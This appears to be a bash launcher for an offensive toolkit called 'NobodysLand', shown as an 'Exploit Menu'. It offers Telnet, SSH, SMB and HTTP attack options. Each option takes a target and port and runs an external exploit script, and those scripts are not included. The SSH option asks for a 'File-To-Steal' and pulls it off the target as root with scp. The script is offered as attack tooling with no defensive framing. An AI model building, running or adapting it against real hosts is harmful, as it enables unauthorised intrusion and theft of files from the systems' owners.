cyan='\e[0;36m' 
green='\033[92m' 
red='\e[1;31m' 
yel='\e[0;33m' 
orange='\e[38;5;166m'

clear

figlet "Exploit"
figlet "Menu"

echo -e $green"========================="
echo -e $red"1)Telnet"
echo -e $red"2)SSH"
echo -e $red"3)SMB"
echo -e $red"4)HTTP"
echo -e $green"========================="

read -p " NLF~#: " attacks

#Telnet 

if [ $attacks = "1" ]
then
clear

figlet "Telnet" |lolcat

read -p " <Target> " t1

read -p " <Port> " p1

cd /$HOME/NobodysLand

python2 Telnet.py --rhost $t1 --rport $p1
fi

#SSH

if [ $attacks = "2" ]
then
clear

figlet "SSH" |lolcat

read -p " <Target> " t2

read -p " <Port> " p2

read -p " <File-To-Steal> " f1
cd /$HOME/NobodysLand

python2 SSH.py

scp -P $p2 root@$t2:$f1

fi

#SMB

if [ $attacks = "3" ]
then
clear

figlet "SMB" |lolcat

read -p " <Target> " t3

read -p " <Port> " p3

cd /$HOME/NobodysLand

python2 SMB.py $t3 $p3
fi

#HTTP

if [ $attacks = "4" ]
then
clear

figlet "HTTP" |lolcat

read -p " <Target> " t4

cd /$HOME/NobodysLand

ruby HTTP.rb $t4

fi
